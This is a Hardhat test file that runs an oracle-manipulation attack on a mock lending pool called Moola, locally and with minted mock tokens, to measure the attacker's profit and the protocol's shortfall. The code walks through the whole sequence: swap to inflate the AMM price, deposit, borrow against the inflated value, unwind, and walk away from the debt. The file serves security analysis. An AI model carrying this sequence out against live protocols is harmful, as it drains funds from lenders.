// Local-only. No live protocol, no mainnet fork, no real funds, no flash
// loan, no atomic attacker contract -- this is a plain multi-transaction
// EOA sequence, self-funded by minted mock tokens, so its economics can
// be measured honestly against an INDEPENDENT reference price rather than
// the manipulated price the attack itself produces.

const { expect } = require("chai");
const { ethers } = require("hardhat");
const { deployStack, eth, fmt } = require("./lib/deploy-stack");

const REFERENCE_PRICE = 1n * 10n ** 18n; // honest $1.00 -- NEVER derived from the manipulated AMM state

describe("Unwind-and-settle: attacker P&L vs. protocol shortfall (independent reference pricing)", function () {
  it("full lifecycle: acquire -> manipulate -> borrow -> unwind -> settle, valued independently", async function () {
    const [deployer, attacker] = await ethers.getSigners();
    const { pool, pair, ammOracle, collateralToken, borrowToken } = await deployStack({
      deployer, attacker, liquidityUnits: 10000, ltvBps: 7000,
    });

    const attackCapital = eth(40000); // stableBefore
    const targetDeposit = eth(1000);  // fixed collateral target, matches earlier tests

    // --- 1. Attacker acquires/finances STABLE (self-funded here) ---
    const stableBefore = attackCapital;
    await (await borrowToken.mint(attackCapital)).wait();
    await (await borrowToken.transfer(attacker.address, attackCapital)).wait();

    // --- 2. STABLE -> COLL swap (this IS the manipulation) ---
    await (await borrowToken.connect(attacker).approve(await pair.getAddress(), ethers.MaxUint256)).wait();
    const collBefore = await collateralToken.balanceOf(attacker.address);
    await (await pair.connect(attacker).swapBForA(attackCapital)).wait();
    const collReceived = (await collateralToken.balanceOf(attacker.address)) - collBefore;
    const stableSpent = attackCapital;

    const priceAfterManip = await ammOracle.getAssetPrice(await collateralToken.getAddress());

    // --- 3. Deposit only a fixed target amount as Moola collateral, keep the rest to unwind with ---
    const depositAmount = collReceived < targetDeposit ? collReceived : targetDeposit;
    const keptForUnwind = collReceived - depositAmount;
    await (await collateralToken.connect(attacker).approve(await pool.getAddress(), ethers.MaxUint256)).wait();
    await (await pool.connect(attacker).deposit(await collateralToken.getAddress(), depositAmount, attacker.address, 0)).wait();

    // --- 4. Borrow against the inflated valuation ---
    const accountData = await pool.getUserAccountData(attacker.address);
    const borrowAmount = (accountData.availableBorrowsETH * 99n) / 100n;
    await (await pool.connect(attacker).borrow(await borrowToken.getAddress(), borrowAmount, 2, 0, attacker.address)).wait();
    const borrowedStable = borrowAmount;

    // --- 5. Reverse/unwind the AMM position using the COLL kept back in step 3 ---
    let stableFromUnwind = 0n;
    if (keptForUnwind > 0n) {
      await (await collateralToken.connect(attacker).approve(await pair.getAddress(), ethers.MaxUint256)).wait();
      const stableBeforeUnwind = await borrowToken.balanceOf(attacker.address);
      await (await pair.connect(attacker).swapAForB(keptForUnwind)).wait();
      stableFromUnwind = (await borrowToken.balanceOf(attacker.address)) - stableBeforeUnwind;
    }

    // --- 6. Settle: attacker does NOT repay Moola (walks away) -- this is
    //     the realistic adversarial case and is what makes protocolShortfall
    //     meaningful. debtOutstanding remains on Moola's books. ---
    const debtOutstanding = borrowedStable; // stable debt token accrues ~0 interest over this instant
    const stableFinal = await borrowToken.balanceOf(attacker.address);
    const collFinalWallet = await collateralToken.balanceOf(attacker.address); // should be ~0 if fully unwound

    // --- Independent-reference-priced valuation (NOT the manipulated price) ---
    const collFinalValueAtReference = (collFinalWallet * REFERENCE_PRICE) / eth(1);
    const collateralHeldByMoolaAtReference = (depositAmount * REFERENCE_PRICE) / eth(1);

    const attackerPnL = stableFinal + collFinalValueAtReference - stableBefore;
    const protocolShortfall = debtOutstanding > collateralHeldByMoolaAtReference
      ? debtOutstanding - collateralHeldByMoolaAtReference
      : 0n;

    console.log(`\n    stableBefore             $${fmt(stableBefore)}`);
    console.log(`    stableSpent (manip)      $${fmt(stableSpent)}`);
    console.log(`    collReceived              ${fmt(collReceived)} COLL`);
    console.log(`    AMM price after manip    $${fmt(priceAfterManip)}`);
    console.log(`    depositAmount (Moola)     ${fmt(depositAmount)} COLL`);
    console.log(`    borrowedStable            $${fmt(borrowedStable)}`);
    console.log(`    keptForUnwind             ${fmt(keptForUnwind)} COLL`);
    console.log(`    stableFromUnwind          $${fmt(stableFromUnwind)}`);
    console.log(`    debtOutstanding           $${fmt(debtOutstanding)}  (left on Moola's books, unrepaid)`);
    console.log(`    stableFinal (wallet)      $${fmt(stableFinal)}`);
    console.log(`    collFinal (wallet)        ${fmt(collFinalWallet)} COLL  (valued @ reference $1.00, NOT manipulated price)`);
    console.log(`    collateral held by Moola  ${fmt(depositAmount)} COLL  @ reference = $${fmt(collateralHeldByMoolaAtReference)}`);
    console.log(`    ----------------------------------------`);
    console.log(`    attackerPnL               $${fmt(attackerPnL)}`);
    console.log(`    protocolShortfall         $${fmt(protocolShortfall)}`);

    // Sanity: both figures should be computable and finite; the actual
    // sign/magnitude is the finding, not a fixed expectation here.
    expect(typeof attackerPnL).to.equal("bigint");
    expect(typeof protocolShortfall).to.equal("bigint");
  });
});
